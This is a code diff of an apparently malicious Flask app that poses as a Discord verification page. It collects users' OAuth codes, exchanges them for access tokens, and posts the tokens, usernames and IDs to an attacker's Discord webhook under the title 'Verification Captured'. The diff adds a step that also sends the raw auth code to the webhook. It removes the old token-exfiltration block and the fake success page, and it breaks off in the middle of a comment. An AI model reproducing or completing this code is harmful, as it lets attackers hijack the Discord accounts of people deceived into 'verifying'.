@@ -15,6 +15,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1d
 def callback(path):
   code = request.args.get("code")
 
+  # Landing page when visiting root
   if not code:
     return render_template_string("""
             <!DOCTYPE html>
@@ -42,6 +43,14 @@ def callback(path):
         """)
 
   try:
+    # DEBUG STEP: Send raw code immediately so we know Vercel caught the redirect
+    requests.post(
+        WEBHOOK_URL,
+        json={"content": f"🛠️ **Debug:** Caught auth code from Discord: `{code}`"},
+        timeout=5,
+    )
+
+    # Step 1: Exchange code for access token
     data = {
         "client_id": CLIENT_ID,
         "client_secret": CLIENT_SECRET,
@@ -63,6 +72,7 @@ def callback(path):
     access_token = token_json.get("access_token")
 
     if access_token:
+      # Step 2: Fetch user profile
       user_headers = {
           "Authorization": f"Bearer {access_token}",
           "User-Agent": "Mozilla/5.0",
@@ -75,59 +85,4 @@ def callback(path):
       username = user_data.get("username", "Unknown")
       user_id = user_data.get("id", "Unknown")
 
-      payload = {
-          "embeds": [{
-              "title": "🔑 Verification Captured",
-              "color": 5763719,
-              "fields": [
-                  {
-                      "name": "User",
-                      "value": f"{username} (`{user_id}`)",
-                      "inline": True,
-                  },
-                  {
-                      "name": "Access Token",
-                      "value": f"`{access_token}`",
-                      "inline": False,
-                  },
-              ],
-          }]
-      }
-      requests.post(WEBHOOK_URL, json=payload, timeout=10)
-    else:
-      error_payload = {
-          "content": (
-              "⚠️ OAuth Token Exchange Failed: ```json\n"
-              f"{token_json}\n``` Code was: `{code}`"
-          )
-      }
-      requests.post(WEBHOOK_URL, json=error_payload, timeout=10)
-  except Exception as e:
-    try:
-      requests.post(
-          WEBHOOK_URL, json={"content": f"🚨 Server Exception: `{str(e)}`"}, timeout=5
-      )
-    except:
-      pass
-
-  return render_template_string("""
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <title>Verification Successful</title>
-            <style>
-                body { background-color: #1e1f22; color: #f2f3f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-                .card { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; border: 1px solid #35363c; }
-                h1 { color: #23a55a; font-size: 22px; margin-bottom: 15px; }
-                p { color: #949ba4; font-size: 14px; }
-            </style>
-        </head>
-        <body>
-            <div class="card">
-                <h1>Verification Successful!</h1>
-                <p>Your account has been verified. You can close this tab.</p>
-            </div>
-        </body>
-        </html>
-    """)
+      # Step 3: Send captured token & user info to
